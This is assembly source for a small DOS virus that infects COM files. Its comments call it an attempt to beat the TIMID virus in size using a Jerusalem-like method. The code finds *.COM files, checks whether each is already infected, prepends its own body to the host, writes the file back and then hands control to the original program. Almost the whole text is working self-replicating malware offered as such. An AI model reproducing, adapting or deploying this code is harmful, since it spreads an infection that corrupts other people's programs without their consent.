;This is a completely different approach to a COM file infector. It is an
;attempt to write an even smaller virus than TIMID. The approach to infection
;is similar to how the Jerusalem virus works.

        .model tiny

        .code

        ORG     100H

START:
        mov     bp,OFFSET START
        mov     dx,OFFSET DTA           ;set new DTA
        mov     ah,1AH
        int     21H
        mov     ah,4EH                  ;find first
        mov     dx,OFFSET CFILE
;       xor     cx,cx                   ;leaving this out screws up an attempt to trace using DEBUG
        int     21H                     ;since debug sets cx=file length, versus dos setting cx=0
FCFLP:  jc      EXIT_VIRUS              ;exit on error
        call    FILE_OPEN               ;open the file to check

        mov     ah,3FH
        mov     dx,OFFSET FBUF
        mov     cl,5                    ;ch=0 already from above
        int     21H                     ;read 5 bytes

        mov     di,dx                   ;DOS leaves dx=OFFSET FBUF
        mov     si,bp
        repz    cmpsb                   ;compare 5 bytes read with start of this program
        jnz     INFECT_FILE             ;different, so clear carry to signal time to infect

        mov     ah,3EH                  ;close file
        int     21H
        mov     ah,4FH                  ;find next
        int     21H
        jmp     SHORT FCFLP

INFECT_FILE:
        call    RESET_FP

        mov     ax,ds
        add     ah,10H                  ;put es above this segment (including the stack)
        mov     es,ax
        mov     cx,OFFSET VIRUS_END - OFFSET START
        mov     si,bp
        mov     di,bp
        rep     movsb                   ;move the virus to that block

        mov     ds,ax
        mov     dx,di
        mov     ah,3FH
        dec     cx                      ;all COM files < 64K
        int     21H                     ;next read the file to that block

        add     di,ax                   ;add bytes read to di
        mov     WORD PTR [EH_PTR+1],di  ;set this pointer up in the infect file
EH_PTR: mov     si,OFFSET EXEC_HOST     ;This is the following instruction, coded as a db to make offset dynamic
        mov     cx,(OFFSET EH_END) - (OFFSET EXEC_HOST)
        push    ds
        push    cs
        pop     ds
        rep     movsb                   ;move the EXEC_HOST routine

        call    RESET_FP
        pop     ds
EXIT_VIRUS:
        mov     ah,40H                  ;this'll give an error if the jump above came here, but so what!
        mov     dx,bp
        mov     cx,di
        dec     ch                      ;subtract 100H from cx
        int     21H                     ;write the file, with virus, back to disk

        push    cs
        pop     ds
        push    cs
        pop     es
        mov     ah,3EH                  ;close the file
        int     21H

        shr     dx,1                    ;set dx=80H
        mov     ah,1AH
        int     21H
        jmp     WORD PTR [EH_PTR+1]

CFILE   DB      '*.COM',0

RESET_FP:
        mov     ah,3EH
        int     21H
FILE_OPEN:
        mov     ax,3D02H                ;open the file
        mov     dx,OFFSET FNAME
        int     21H
        mov     bx,ax
        ret

VIRUS_END:

HOST:                                   ;This is a dummy host that just
        mov     ax,4C00H                ;exits to DOS
        int     21H

EXEC_HOST:
        call    EH1
EH1:
        pop     cx                      ;cx=OFFSET EXEC_HOST
        mov     di,bp
        push    di                      ;save 100H as return address
        mov     si,OFFSET VIRUS_END
        sub     cx,si                   ;move this many bytes
        rep     movsb
        ret

EH_END:

        ORG     0FF00H

DTA     DB      1AH dup (?)             ;file search buffer
FSIZE   DD      ?
FNAME   DB      13 dup (?)
FBUF    DB      5 dup (?)             ;buffer for compare


        END     START
